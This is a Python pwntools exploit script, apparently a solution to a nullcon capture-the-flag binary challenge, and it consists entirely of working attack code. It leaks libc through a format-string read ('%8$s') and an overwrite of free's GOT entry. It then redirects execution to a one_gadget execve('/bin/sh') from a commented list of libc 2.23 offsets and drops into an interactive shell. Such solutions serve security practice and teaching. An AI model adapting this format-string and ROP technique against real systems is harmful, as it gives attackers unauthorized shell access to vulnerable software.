#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./challenge",
	"libc" : "/lib/x86_64-linux-gnu/libc-2.23.so",
	"HOST" : "pwn.ctf.nullcon.net",
	"PORT" : 4001
}

def exploit(r):

	r.recvline()
	r.sendline("y")

	r.sendlineafter(": ", "%8$s")
	rop = [
		e.got["free"],
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		e.symbols["main"]
	]
	
	r.recvline()
	r.sendline(str(0xff))

	for qword in rop:
		if qword == "-":
			r.sendline(qword)
			r.sendline(qword)
			continue
		r.sendline(str(qword&0xffffffff))
		r.sendline(str((qword>>32)&0xffffffff))

	for i in xrange(0xff-len(rop)*2):
		r.sendline("-")
	r.recvuntil("Tressure Box: ")
	libc_base = u64(r.recvn(6).ljust(8, '\x00'))-libc.symbols["free"]
	log.info("libc_base : 0x{:x}".format(libc_base))
	"""
		0x45216	execve("/bin/sh", rsp+0x30, environ)
		constraints:
		  rax == NULL
		
		0x4526a	execve("/bin/sh", rsp+0x30, environ)
		constraints:
		  [rsp+0x30] == NULL
		
		0xf02a4	execve("/bin/sh", rsp+0x50, environ)
		constraints:
		  [rsp+0x50] == NULL
		
		0xf1147	execve("/bin/sh", rsp+0x70, environ)
		constraints:
		  [rsp+0x70] == NULL
	"""
	one_gadget = libc_base + 0x45216


	r.recvline()
	r.sendline("y")

	r.sendlineafter(": ", "%8$s")
	rop = [
		e.got["free"],
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		"-",
		one_gadget
	]
	
	r.recvline()
	r.sendline(str(0xff))

	for qword in rop:
		if qword == "-":
			r.sendline(qword)
			r.sendline(qword)
			continue
		r.sendline(str(qword&0xffffffff))
		r.sendline(str((qword>>32)&0xffffffff))

	for i in xrange(0xff-len(rop)*2):
		r.sendline("-")
	
	r.interactive()
	return

if __name__ == "__main__":
	
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if sys.argv[-1] == "remote":
		r = remote(config["HOST"], config["PORT"])
		exploit(r)
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
